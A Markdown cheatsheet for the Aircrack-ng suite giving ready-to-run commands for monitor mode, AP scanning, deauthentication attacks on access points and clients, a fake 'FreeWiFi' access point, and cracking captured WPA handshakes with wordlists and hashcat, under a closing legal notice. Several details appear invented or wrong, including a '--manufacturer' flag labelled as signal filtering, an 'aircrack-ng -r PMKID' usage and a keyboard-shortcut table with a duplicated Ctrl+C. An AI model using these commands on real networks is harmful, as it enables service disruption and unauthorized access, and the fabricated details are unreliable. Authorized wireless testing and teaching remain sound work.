# 🔐 Aircrack-ng Suite Cheatsheet

A comprehensive reference for wireless security testing with the Aircrack-ng suite.


---

## 🔧 Monitor Mode Setup

=== "Basic Setup"
    
    **Check available interfaces:**
    ```bash
    iwconfig
    ```

    **Enable monitor mode:**
    ```bash
    sudo airmon-ng start wlan0
    ```

    **Verify monitor mode:**
    ```bash
    iwconfig
    ```

    !!! tip "Basic Setup"
        - **Pros**: Simple, straightforward
        - **Cons**: May conflict with NetworkManager
        - **Best for**: Dedicated testing machines

=== "Check Kill Method"
    
    **Kill interfering processes:**
    ```bash
    sudo airmon-ng check kill
    ```

    **Start monitor mode:**
    ```bash
    sudo airmon-ng start wlan0
    ```

    **Verify interface:**
    ```bash
    iwconfig
    ```

    !!! warning "Check Kill Method"
        - **Pros**: Resolves most conflicts
        - **Cons**: Disrupts network services
        - **Best for**: Systems with network conflicts

=== "Manual Setup"
    
    **Bring interface down:**
    ```bash
    sudo ifconfig wlan0 down
    ```

    **Set monitor mode:**
    ```bash
    sudo iwconfig wlan0 mode monitor
    ```

    **Bring interface up:**
    ```bash
    sudo ifconfig wlan0 up
    ```

    **Verify mode:**
    ```bash
    iwconfig
    ```

    !!! danger "Manual Setup"
        - **Pros**: Full control, bypasses airmon-ng
        - **Cons**: More complex, requires manual management
        - **Best for**: Advanced users, troubleshooting

---

## 🔍 AP Discovery

=== "Basic Scanning"

    **Scan all channels:**
    ```bash
    sudo airodump-ng wlan0mon
    ```

    **Scan specific channel:**
    ```bash
    sudo airodump-ng -c 6 wlan0mon
    ```

    **Scan multiple channels:**
    ```bash
    sudo airodump-ng -c 1,6,11 wlan0mon
    ```

    !!! tip "Basic Scanning"
        - **Pros**: Simple, shows all networks
        - **Cons**: May be overwhelming with many APs
        - **Best for**: Initial reconnaissance

=== "Target Specific"

    **Target by BSSID:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
    ```

    **Target by ESSID (network name):**
    ```bash
    sudo airodump-ng -c 6 --essid "TargetNetwork" wlan0mon
    ```

    **Target with file output:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
    ```

    !!! info "Target Specific"
        - **Pros**: Focused, less noise
        - **Cons**: Requires prior knowledge of target
        - **Best for**: Known targets, specific assessments

=== "Advanced Filtering"

    **Filter by encryption:**
    ```bash
    sudo airodump-ng --encrypt WPA wlan0mon
    ```

    **Filter by manufacturer:**
    ```bash
    sudo airodump-ng --manufacturer "Cisco" wlan0mon
    ```

    **Filter by signal strength:**
    ```bash
    sudo airodump-ng --manufacturer "Netgear" wlan0mon
    ```

    !!! warning "Advanced Filtering"
        - **Pros**: Highly targeted, efficient
        - **Cons**: May miss important targets
        - **Best for**: Specific vulnerability assessments

---

## ⚡ Capture Handshake

=== "Passive Capture"

    **Start capture:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
    ```

    !!! tip "Passive Capture"
        - **Pros**: No interference, stealthy
        - **Cons**: Requires patience, depends on client activity
        - **Best for**: High-traffic networks with regular connections
        - **Note**: Wait for client to connect naturally and monitor for WPA handshake in top-right corner

=== "Active Deauth"

    **Terminal 1 - Capture handshake:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
    ```

    **Terminal 2 - Deauth attack:**
    ```bash
    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
    ```

    **Terminal 3 - Target specific client:**
    ```bash
    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan0mon
    ```

    !!! warning "Active Deauth"
        - **Pros**: Faster results, more reliable
        - **Cons**: More detectable, may cause network disruption
        - **Best for**: Testing environments, authorized assessments

=== "Fake AP Attack"

    **Create fake AP:**
    ```bash
    sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" wlan0mon
    ```

    **Capture handshakes from connecting clients:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w fake_handshake wlan0mon
    ```

    !!! danger "Fake AP Attack"
        - **Pros**: Can capture multiple handshakes
        - **Cons**: Highly detectable, requires careful setup
        - **Best for**: Advanced testing, social engineering scenarios

---

## 🔓 Crack Handshake

=== "Dictionary Attack"

    **Basic dictionary attack:**
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
    ```

    **Custom wordlist:**
    ```bash
    sudo aircrack-ng -w /path/to/custom.txt handshake-01.cap
    ```

    **Multiple wordlists:**
    ```bash
    sudo aircrack-ng -w wordlist1.txt,wordlist2.txt handshake-01.cap
    ```

    !!! tip "Dictionary Attack"
        - **Pros**: Fast with good wordlists, common passwords
        - **Cons**: Limited to wordlist contents
        - **Best for**: Common passwords, social engineering

=== "Brute Force Attack"

    **4-way handshake brute force:**
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
    ```

    **PMKID attack (if supported):**
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -r PMKID handshake-01.cap
    ```

    !!! warning "Brute Force Attack"
        - **Pros**: Comprehensive, finds complex passwords
        - **Cons**: Very slow, resource intensive
        - **Best for**: Short passwords, targeted attacks

=== "Hashcat Integration"

    **Convert cap to hccapx:**
    ```bash
    cap2hccapx handshake-01.cap handshake.hccapx
    ```

    **Hashcat attack:**
    ```bash
    hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
    ```

    **GPU acceleration:**
    ```bash
    hashcat -m 2500 -d 1 handshake.hccapx /usr/share/wordlists/rockyou.txt
    ```

    !!! danger "Hashcat Integration"
        - **Pros**: GPU acceleration, advanced techniques
        - **Cons**: Requires powerful hardware, complex setup
        - **Best for**: Professional assessments, high-performance cracking

---

## ⌨️ Keyboard Shortcuts

=== "Navigation Shortcuts"

    | Key | Action | Description |
    |-----|--------|-------------|
    | ++ctrl+c++ | **Exit** | Stop scanning and exit |
    | ++ctrl+s++ | **Sort** | Cycle through sort options |
    | ++ctrl+r++ | **Reset** | Reset statistics |
    | ++ctrl+a++ | **AP List** | Toggle AP list view |
    | ++ctrl+c++ | **Client List** | Toggle client list view |
    | ++ctrl+f++ | **Filter** | Set MAC address filter |
    | ++ctrl+m++ | **Mark** | Mark/Unmark AP for targeting |
    | ++ctrl+t++ | **Target** | Set target AP |
    | ++ctrl+u++ | **Update** | Update display |
    | ++ctrl+w++ | **Write** | Write to file |
    | ++ctrl+x++ | **Export** | Export data |

=== "Colour Shortcuts"

    | Key | Action | Description |
    |-----|--------|-------------|
    | ++ctrl+m++ | **Mark** | Mark/Unmark AP for targeting |
    | ++ctrl+1++ | **Red** | Highlight in red |
    | ++ctrl+2++ | **Green** | Highlight in green |
    | ++ctrl+3++ | **Yellow** | Highlight in yellow |
    | ++ctrl+4++ | **Blue** | Highlight in blue |
    | ++ctrl+5++ | **Magenta** | Highlight in magenta |
    | ++ctrl+6++ | **Cyan** | Highlight in cyan |
    | ++ctrl+7++ | **White** | Highlight in white |
    | ++ctrl+0++ | **Clear** | Remove colour highlighting |

    !!! tip "Colour Coding Strategy"
        - **Red**: High priority targets, WEP networks
        - **Green**: APs with active clients
        - **Yellow**: WPS-enabled networks
        - **Blue**: High-signal strength APs
        - **Magenta**: Hidden SSID networks
        - **Cyan**: 5GHz networks
        - **White**: Recently discovered APs

---

## 📚 Abbreviations Reference

| Abbreviation | Full Term | Description |
|--------------|-----------|-------------|
| **BSSID** | Basic Service Set Identifier | Unique MAC address of the access point |
| **ESSID** | Extended Service Set Identifier | Network name (what users see) |
| **MAC** | Media Access Control | Hardware address of network interface |
| **AP** | Access Point | Wireless router/device providing network |
| **SSID** | Service Set Identifier | Network name (same as ESSID) |
| **WPA** | Wi-Fi Protected Access | Wireless security protocol |
| **WEP** | Wired Equivalent Privacy | Older, weaker wireless security |
| **WPS** | Wi-Fi Protected Setup | Easy connection method (vulnerable) |
| **PMKID** | Pairwise Master Key Identifier | WPA3/WPA2 authentication method |
| **PSK** | Pre-Shared Key | Password for WPA networks |
| **IV** | Initialization Vector | Used in WEP encryption |
| **TKIP** | Temporal Key Integrity Protocol | WPA encryption method |
| **CCMP** | Counter Mode with CBC-MAC Protocol | WPA2 encryption method |
| **AES** | Advanced Encryption Standard | Strong encryption algorithm |
| **RSSI** | Received Signal Strength Indicator | Signal strength measurement |
| **SNR** | Signal-to-Noise Ratio | Signal quality measurement |
| **VLAN** | Virtual Local Area Network | Network segmentation |
| **DHCP** | Dynamic Host Configuration Protocol | Automatic IP assignment |
| **DNS** | Domain Name System | Name resolution service |
| **NAT** | Network Address Translation | IP address translation |
| **VPN** | Virtual Private Network | Secure network connection |

---

## 📋 Quick Reference

| Task | Command |
|------|---------|
| **Start Monitor** | `sudo airmon-ng start wlan0` |
| **Check Kill** | `sudo airmon-ng check kill` |
| **Scan APs** | `sudo airodump-ng wlan0mon` |
| **Target AP** | `sudo airodump-ng -c 6 --bssid BSSID wlan0mon` |
| **Capture** | `sudo airodump-ng -c 6 --bssid BSSID -w capture wlan0mon` |
| **Deauth** | `sudo aireplay-ng -0 5 -a BSSID wlan0mon` |
| **Crack** | `sudo aircrack-ng -w wordlist.txt capture-01.cap` |

---

## ⚠️ Legal Notice

!!! warning "Important Legal Notice"
    **This cheatsheet is for educational and authorized testing purposes only.**
    
    - Only test networks you own or have explicit permission to test
    - Unauthorized access to networks is illegal
    - Use responsibly and ethically
    - Follow local laws and regulations

---

## 🔗 Additional Resources

- [Aircrack-ng Official Documentation](https://www.aircrack-ng.org/)
- [Kali Linux Wireless Testing](https://www.kali.org/tools/aircrack-ng/)
- [Wireless Security Best Practices](https://www.wi-fi.org/security)
